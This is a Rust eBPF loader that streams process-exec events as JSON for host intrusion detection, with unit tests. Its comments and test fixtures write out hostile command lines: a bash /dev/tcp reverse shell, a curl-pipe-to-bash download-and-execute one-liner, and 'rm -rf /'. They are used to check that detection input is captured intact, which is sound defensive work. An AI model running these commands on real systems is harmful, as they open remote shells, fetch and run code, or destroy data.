//! host-telemetry execsnoop loader — load execsnoop.bpf.o, attach the sched_process_exec tracepoint,
//! and stream every exec as an `ingest_host_event` JSON line ({"type":"process",…}) to stdout.
//!
//! The LOW-OVERHEAD production host-telemetry producer (vs host-telemetry-export.sh, which polls /proc
//! and misses short-lived processes). Identical output contract → the evidence graph ingests both the
//! same way (ADR 0009 host layer). BPF glue is behind `--features bpf` (needs libbpf + the compiled
//! .bpf.o); the pure event→JSON logic builds + tests anywhere (mirrors napse-capture/loader).

/// NUL-terminated bytes → owned String (no escaping here — serde_json handles JSON escaping, both
/// for this and for the JSON-string-embedding done in [`build_cmdline`] below: attacker-controlled
/// argv bytes — quotes, backslashes, control chars, newlines — only ever reach the wire through
/// `serde_json::json!`, which escapes them, so a crafted arg can never break the emitted JSON line).
fn cstr(b: &[u8]) -> String {
    let end = b.iter().position(|&c| c == 0).unwrap_or(b.len());
    String::from_utf8_lossy(&b[..end]).into_owned()
}

// Layout contract with execsnoop.bpf.c's `struct exec_event`/`argv` field: a fixed `pid`/`ppid`/
// `comm`/`filename` header, then NUM_SLOTS fixed ARGSIZE-byte argv slots (each independently
// NUL-terminated, `bpf_probe_read_user_str`'s guarantee), then `nargs`/`truncated`/`_pad`.
//
// F2-secondary (2026-07-06 Pi4 pentest finding): ARGSIZE was 32 — a `curl -s http://x/y.sh |
// bash` one-liner (passed as a SINGLE argv element to `sh -c`/`bash -c`) got silently cut to
// `curl -s http://10.200.0.1/x.sh ` — the `| bash` suffix that `host_edr::classify_exec`'s
// `pipes_to_interpreter` rule keys on never survived the capture, so download-exec silently
// escaped detection (reverse-shell/`/dev/tcp`/python one-liners still matched because THEIR
// tell lands inside the first 32 bytes). Raised to 160 (>= the requested 128B floor, plus
// headroom so a full 128-byte argument — 128 visible bytes + its NUL terminator — round-trips
// without truncation: `bpf_probe_read_user_str`'s copy includes the NUL, so storing exactly 128
// visible bytes needs 129 slot bytes minimum). This only grows a PERCPU_ARRAY-backed scratch
// value and a ringbuf reservation (both map/heap-backed, not BPF stack — well within the
// verifier's 512B *stack-frame* limit, which never applies to map values) and each event's wire
// size (2716B here vs 1MB ring buffer capacity) — no verifier/stack-budget risk either way.
const ARGSIZE: usize = 160;
const NUM_SLOTS: usize = 16; // MAX_ARGS(15) + 1 reserved truncation-marker slot
const ARGV_BUF_LEN: usize = ARGSIZE * NUM_SLOTS; // 2560

// Fixed header layout shared by `format_event` and the test-only `raw_event` builder below —
// named offsets instead of magic numbers so a future ARGSIZE/NUM_SLOTS change (like this one)
// can't silently desync a hand-copied literal offset the way the previous 152/664/665 constants
// did (this fix replaces those with expressions derived from the SAME constants above).
const PID_LEN: usize = 4;
const PPID_LEN: usize = 4;
const COMM_LEN: usize = 16;
const FNAME_LEN: usize = 128;
const PID_OFF: usize = 0;
const PPID_OFF: usize = PID_OFF + PID_LEN;
const COMM_OFF: usize = PPID_OFF + PPID_LEN;
const FNAME_OFF: usize = COMM_OFF + COMM_LEN;
const ARGV_OFF: usize = FNAME_OFF + FNAME_LEN; // 152, unchanged by the ARGSIZE bump
const NARGS_OFF: usize = ARGV_OFF + ARGV_BUF_LEN;
const TRUNCATED_OFF: usize = NARGS_OFF + 1;
const PAD_LEN: usize = 2; // matches `struct exec_event`'s explicit trailing `_pad[2]`
const EVENT_LEN: usize = TRUNCATED_OFF + 1 + PAD_LEN; // 2716 (was 668 at ARGSIZE=32)

/// Space-join the first `nargs` fixed-size argv slots into one command line (e.g.
/// `"bash -i >& /dev/tcp/1.2.3.4/4444"`), bounded to at most `NUM_SLOTS` slots regardless of what
/// `nargs` claims (a corrupt/adversarial value can never over-read `argv_bytes`). `nargs == 0`
/// (no captured argv — the sys_enter_execve(at) hook missed this exec, or the kernel-side capture
/// hit a read failure) returns `None` so the caller falls back to the binary path, exactly today's
/// pre-argv behavior — never a crash, never a dropped event.
fn build_cmdline(argv_bytes: &[u8], nargs: u8) -> Option<String> {
    let n = (nargs as usize).min(NUM_SLOTS);
    if n == 0 {
        return None;
    }
    let mut parts = Vec::with_capacity(n);
    for i in 0..n {
        let start = i * ARGSIZE;
        let end = (start + ARGSIZE).min(argv_bytes.len());
        if start >= end {
            break;
        }
        parts.push(cstr(&argv_bytes[start..end]));
    }
    if parts.is_empty() {
        return None;
    }
    Some(parts.join(" "))
}

/// Parse one `struct exec_event` → `ingest_host_event` JSON via serde_json (so a comm/filename/argv
/// with a `"`, `\`, or newline can't forge a line). Pure — the byte layout is the contract with
/// execsnoop.bpf.c; tested below.
///
/// Fixed layout (`EVENT_LEN` bytes total; matches `struct exec_event` exactly, including its
/// explicit trailing `_pad[2]`) — see the named `*_OFF`/`*_LEN` constants above:
///   `pid`(u32) `ppid`(u32) `comm`(16) `filename`(128) `argv`(ARGV_BUF_LEN) `nargs`(u8)
///   `truncated`(u8) `_pad`(2)
pub fn format_event(data: &[u8], self_ip: &str, ts: u64) -> Option<String> {
    if data.len() < EVENT_LEN {
        return None;
    }
    let pid = u32::from_ne_bytes(data[PID_OFF..PID_OFF + PID_LEN].try_into().unwrap());
    let ppid = u32::from_ne_bytes(data[PPID_OFF..PPID_OFF + PPID_LEN].try_into().unwrap());
    let comm = cstr(&data[COMM_OFF..COMM_OFF + COMM_LEN]);
    let file = cstr(&data[FNAME_OFF..FNAME_OFF + FNAME_LEN]);
    let nargs = data[NARGS_OFF];
    // fail-safe: no captured argv (or a truncated/short read that couldn't have produced one) →
    // fall back to the bare binary path, i.e. today's pre-argv behavior — never crash, never drop.
    let cmdline = build_cmdline(&data[ARGV_OFF..ARGV_OFF + ARGV_BUF_LEN], nargs).unwrap_or(file);
    Some(serde_json::json!({
        "type": "process",
        "ts": ts as f64,
        "device_ip": self_ip,
        "pid": pid,
        "name": comm,
        "cmdline": cmdline,
        "parent_pid": ppid,
    }).to_string())
}

#[cfg(feature = "bpf")]
fn now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(feature = "bpf")]
fn run(obj_path: &str, self_ip: &str) -> anyhow::Result<()> {
    use anyhow::Context;
    use libbpf_rs::{MapCore, ObjectBuilder, RingBufferBuilder};
    use std::ffi::OsStr;
    use std::io::Write;
    use std::time::Duration;

    let mut builder = ObjectBuilder::default();
    // CO-RE BTF source (ADR 0029/0030): execsnoop.bpf.c is CO-RE (vmlinux.h + BPF_CORE_READ). Native
    // BTF on Debian/UEFI ⇒ no-op; RPi BSP kernels lack CONFIG_DEBUG_INFO_BTF ⇒ use the shipped
    // /usr/lib/hookprobe/btf/vmlinux-$(uname -r).btf blob, else fail honestly. `_btf_guard` OWNS the
    // path CString libbpf reads during open_file — keep it alive across open/load.
    let _btf_guard = hookprobe_manifest::xdp::apply_btf_custom_path(&mut builder)
        .map_err(anyhow::Error::msg)
        .context("resolve CO-RE BTF for execsnoop")?;
    let obj = builder
        .open_file(obj_path).context("open bpf object")?
        .load().context("load + verify bpf")?;
    // SEC("tracepoint/…") programs auto-attach on .attach(); the returned Links MUST stay alive
    // (dropping a Link detaches the program), so hold them for the lifetime of the poll loop.
    let mut _links = Vec::new();
    for prog in obj.progs_mut() {
        _links.push(prog.attach().context("attach sched_process_exec")?);
    }
    let map = obj.maps().find(|m| m.name() == OsStr::new("events")).context("ringbuf map 'events' missing")?;

    let self_ip = self_ip.to_string();
    let mut rbb = RingBufferBuilder::new();
    rbb.add(&map, move |data: &[u8]| {
        if let Some(j) = format_event(data, &self_ip, now_secs()) {
            println!("{j}");
            let _ = std::io::stdout().flush(); // line-flush for the streaming ingest (like the engines)
        }
        0
    })?;
    let rb = rbb.build()?;
    eprintln!("execsnoop: attached sched_process_exec, streaming host events from {obj_path}");
    loop {
        rb.poll(Duration::from_millis(200))?;
    }
}

#[cfg(not(feature = "bpf"))]
fn run(_obj_path: &str, _self_ip: &str) -> anyhow::Result<()> {
    anyhow::bail!("built without the `bpf` feature — rebuild with `--features bpf` (needs libbpf + execsnoop.bpf.o)")
}

fn main() -> anyhow::Result<()> {
    let obj_path = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "/usr/lib/hookprobe/bpf/execsnoop.bpf.o".to_string());
    let self_ip = std::env::var("HOOKPROBE_DEVICE_IP").unwrap_or_else(|_| "127.0.0.1".to_string());
    run(&obj_path, &self_ip)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build one raw `struct exec_event` byte buffer for tests: pid/ppid/comm/filename plus a set
    /// of argv slots (each written NUL-terminated into its fixed ARGSIZE-byte slot, exactly as
    /// execsnoop.bpf.c's `bpf_probe_read_user_str` would), and nargs/truncated set to match.
    fn raw_event(pid: u32, ppid: u32, comm: &str, file: &str, argv: &[&str], truncated: bool) -> Vec<u8> {
        let mut data = vec![0u8; EVENT_LEN];
        data[PID_OFF..PID_OFF + PID_LEN].copy_from_slice(&pid.to_ne_bytes());
        data[PPID_OFF..PPID_OFF + PPID_LEN].copy_from_slice(&ppid.to_ne_bytes());
        let c = comm.as_bytes();
        data[COMM_OFF..COMM_OFF + c.len().min(COMM_LEN)].copy_from_slice(&c[..c.len().min(COMM_LEN)]);
        let f = file.as_bytes();
        data[FNAME_OFF..FNAME_OFF + f.len().min(FNAME_LEN)].copy_from_slice(&f[..f.len().min(FNAME_LEN)]);
        for (i, arg) in argv.iter().enumerate().take(NUM_SLOTS) {
            let start = ARGV_OFF + i * ARGSIZE;
            let ab = arg.as_bytes();
            let n = ab.len().min(ARGSIZE - 1); // leave room for the NUL, like bpf_probe_read_user_str
            data[start..start + n].copy_from_slice(&ab[..n]);
            // rest of the slot is already zero (NUL) from the vec init
        }
        data[NARGS_OFF] = argv.len().min(NUM_SLOTS) as u8;
        data[TRUNCATED_OFF] = truncated as u8;
        data
    }

    #[test]
    fn formats_exec_event_falls_back_to_path_with_no_argv() {
        // nargs = 0 (e.g. sys_enter_execve missed this exec, or the scratch-map lookup missed) —
        // must fall back to the bare binary path exactly like the pre-argv-capture behavior.
        let data = raw_event(1234, 800, "powershell", "/usr/bin/powershell", &[], false);
        let j = format_event(&data, "10.0.0.5", 1000).unwrap();
        assert!(j.contains("\"type\":\"process\"") && j.contains("\"pid\":1234") && j.contains("\"parent_pid\":800"));
        assert!(j.contains("\"name\":\"powershell\"") && j.contains("\"cmdline\":\"/usr/bin/powershell\""));
        assert!(j.contains("\"device_ip\":\"10.0.0.5\""));
    }

    #[test]
    fn formats_exec_event_with_full_cmdline() {
        // the live-found gap this whole fix closes: cmdline must now carry the FULL argv, not just
        // the bare path, so host_edr::classify_exec's arg-pattern rules can actually see it.
        let data = raw_event(1, 1, "bash", "/bin/bash", &["bash", "-i", ">&", "/dev/tcp/1.2.3.4/4444", "0>&1"], false);
        let j = format_event(&data, "10.0.0.5", 1000).unwrap();
        assert!(j.contains("\"cmdline\":\"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\""));
    }

    #[test]
    fn f2_secondary_download_exec_pipe_to_bash_no_longer_truncated() {
        // THE exact live pentest finding: `curl -s http://10.200.0.1/x.sh | bash` run via
        // `sh -c "<one-liner>"` lands as a SINGLE argv element. At the old ARGSIZE=32 this arrived
        // as `curl -s http://10.200.0.1/x.sh ` — the `| bash` suffix `host_edr::classify_exec`'s
        // `pipes_to_interpreter` rule matches on was silently cut off. Must now survive whole.
        let one_liner = "curl -s http://10.200.0.1/x.sh | bash";
        assert!(one_liner.len() < ARGSIZE, "fixture must fit in one slot to prove no truncation");
        let data = raw_event(1, 1, "sh", "/bin/sh", &["sh", "-c", one_liner], false);
        let j = format_event(&data, "10.0.0.5", 1000).unwrap();
        assert!(
            j.contains("| bash"),
            "the `| bash` suffix must survive into cmdline (F2-secondary regression): {j}"
        );
        let parsed: serde_json::Value = serde_json::from_str(&j).unwrap();
        assert_eq!(
            parsed["cmdline"].as_str().unwrap(),
            "sh -c curl -s http://10.200.0.1/x.sh | bash"
        );
    }

    #[test]
    fn a_128_byte_argument_round_trips_untruncated() {
        // The F7 brief's explicit acceptance bar: "a 128B-arg cmdline round-trips". Build an
        // argv element of EXACTLY 128 visible bytes and confirm every byte survives (ARGSIZE=160
        // leaves room for the 128 visible bytes + the NUL `bpf_probe_read_user_str` also copies).
        let arg128: String = "A".repeat(128);
        assert_eq!(arg128.len(), 128);
        let data = raw_event(1, 1, "x", "/usr/bin/x", &["x", &arg128], false);
        let j = format_event(&data, "10.0.0.5", 1000).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&j).unwrap();
        let cmdline = parsed["cmdline"].as_str().unwrap();
        assert!(
            cmdline.ends_with(&arg128),
            "the full 128-byte argument must round-trip with no truncation: got {cmdline:?}"
        );
    }

    #[test]
    fn truncation_marker_is_joined_in() {
        let mut argv: Vec<&str> = (0..15).map(|_| "x").collect();
        argv.push("...");
        let data = raw_event(1, 1, "x", "/usr/bin/x", &argv, true);
        let j = format_event(&data, "10.0.0.5", 1000).unwrap();
        assert!(j.contains("..."), "truncation marker must survive into the emitted cmdline: {j}");
    }

    #[test]
    fn crafted_arg_with_quote_and_newline_stays_valid_json() {
        // argv is attacker-controlled: an embedded `"`, `\`, or newline must not break the JSON
        // line the evidence ingester reads (serde_json::json! is the only thing that touches it).
        let data = raw_event(1, 1, "sh", "/bin/sh", &["sh", "-c", "echo \"pwned\"\nrm -rf /"], false);
        let j = format_event(&data, "10.0.0.5", 1000).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&j).expect("emitted line must still parse as valid JSON");
        assert!(parsed["cmdline"].as_str().unwrap().contains("pwned"));
    }

    #[test]
    fn rejects_short_buffer() {
        assert!(format_event(&[0u8; 10], "x", 1).is_none());
    }
}
